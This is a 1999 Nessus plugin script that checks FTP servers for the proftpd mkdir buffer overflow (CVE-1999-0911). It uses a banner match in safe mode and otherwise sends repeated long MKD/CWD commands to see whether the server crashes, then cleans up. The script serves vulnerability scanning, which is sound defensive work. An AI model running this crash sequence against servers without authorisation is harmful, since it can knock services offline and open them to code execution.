#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
# 
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10189);
 script_bugtraq_id(612);
 script_version ("$Revision: 1.30 $");
 script_cve_id("CVE-1999-0911");
 name["english"] = "proftpd mkdir buffer overflow";
 name["francais"] = "Dépassement de buffer proftpd par mkdir";
 
 script_name(english:name["english"],
 	     francais:name["francais"]);
	     
 desc["english"] = "
It was possible to make the remote FTP server crash
by creating a huge directory structure with
directory names not being longer than 255 chars.
This is usually called the 'proftpd buffer overflow'
even though it affects other FTP servers.

It is very likely that an attacker can use this
flaw to execute arbitrary code on the remote 
server. This will give him a shell on your system,
which is not a good thing.

Solution : upgrade your FTP server.
Consider removing directories writable by 'anonymous'.

Risk factor : High";
		 
		 
desc["francais"] = "
Il s'est avéré possible de faire planter le serveur
FTP distant en y créant une grande structure de
répertoires dont les noms sont inférieurs à 255
caractères.
On appelle souvent ce problème le 'dépassement de buffer
proftpd' bien qu'il concerne d'autres serveurs FTP.

Il est très probable qu'un pirate puisse utiliser ce
problème pour executer du code arbitraire sur le serveur
distant, ce qui lui donnera un shell sur votre système,
ce qui n'est pas une bonne chose.

Solution : mettez à jour votre serveur FTP, ou contactez
votre vendeur pour un patch.
	   
Facteur de risque : Elevé";
	 	     
 script_description(english:desc["english"],
 		    francais:desc["francais"]);
		    
 
 script_summary(english:"Checks if the remote ftp can be buffer overflown",
 		francais:"Détermine si le serveur ftp distant peut etre soumis a un dépassement de buffer");
 script_category(ACT_MIXED_ATTACK); # mixed
 script_family(english:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
		  
 script_dependencie("find_service.nes", "ftp_writeable_directories.nasl", "wu_ftpd_overflow.nasl");
 script_require_keys("ftp/login", "ftp/writeable_dir");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here : 
#
include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if (! get_port_state(port)) exit(0);

if(safe_checks())
{
 banner = get_ftp_banner(port: port);
  if(banner)
  {
   if(egrep(pattern:"^220 ProFTPD 1\.2\.0pre[1-5][^0-9]",
   	  string:banner))
	  {
	   report = "
The remote ProFTPd server is vulnerable to
a buffer overflow when issued a too long
mkdir command.

An attacker may use this flaw to execute arbitrary
commands on the remote host.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : upgrade to ProFTPd 1.2.0pre6 or newer
Risk factor : High";
        security_hole(port:port, data:report);
	  }
  }
 exit(0);
}


# First, we need anonymous access

login = get_kb_item("ftp/login");
pass  = get_kb_item("ftp/password");

if(!login)exit(0);

# Then, we need a writeable directory
wri = get_kb_item("ftp/writeable_dir");
if(!wri)exit(0);



ovf = get_kb_item("ftp/wu_ftpd_overflow");
if(ovf)exit(0);

nomkdir = get_kb_item("ftp/no_mkdir");
if(nomkdir)exit(0);

# Connect to the FTP server
soc = open_sock_tcp(port);
if(soc)
{
 if(ftp_authenticate(socket:soc, user:login, pass:pass))
 {
  num_dirs = 0;
  # We are in
 
  c = string("CWD ", wri, "\r\n");
  send(socket:soc, data:c);
  b = ftp_recv_line(socket:soc);
  cwd = string("CWD ", crap(254), "\r\n");
  mkd = string("MKD ", crap(254), "\r\n");
  
  #
  # Repeat the same operation 20 times. After the 20th, we
  # assume that the server is immune (or has a bigger than
  # 5Kb buffer, which is unlikely
  # 
  
  
  for(i=0;i<20;i=i+1)
  {
  send(socket:soc, data:mkd);
  b = ftp_recv_line(socket:soc);
  
  # No answer = the server has closed the connection. 
  # The server should not crash after a MKD command
  # but who knows ?
  
  if(!b){
  	security_hole(port);
	exit(0);
	}
	
  if(!egrep(pattern:"^257 .*", string:b))
  {
   i = 20;
  }
  else
  {
  send(socket:soc,data:cwd);
  b = ftp_recv_line(socket:soc);
  
  #
  # See above. The server is likely to crash
  # here
  
  if(!b)
       {
  	security_hole(port);
	exit(0);
       }
       
   if(!egrep(pattern:"^250 .*", string:b))
   {
    i = 20;
   }
   else num_dirs = num_dirs + 1;
   }
  }
  ftp_close(socket:soc);
  
  if(!num_dirs)exit(0);
  
  soc = open_sock_tcp(port);
  if(!soc)exit(0);
  
  ftp_authenticate(socket:soc, user:login, pass:pass);
  send(socket:soc, data:string("CWD ", wri, "\r\n"));
  r = ftp_recv_line(socket:soc);
  for(j=0;j<num_dirs;j=j+1)
  {
   send(socket:soc, data:string("CWD ", crap(254), "\r\n"));
   r = ftp_recv_line(socket:soc);
  }
  
  for(j=0;j<num_dirs + 1;j=j+1)
  {
   send(socket:soc, data:string("RMD ", crap(254),  "\r\n"));
   r = ftp_recv_line(socket:soc);
   if(!egrep(pattern:"^250 .*", string:r))exit(0);
   send(socket:soc, data:string("CWD ..\r\n"));
   r = ftp_recv_line(socket:soc);
  }
 }
}

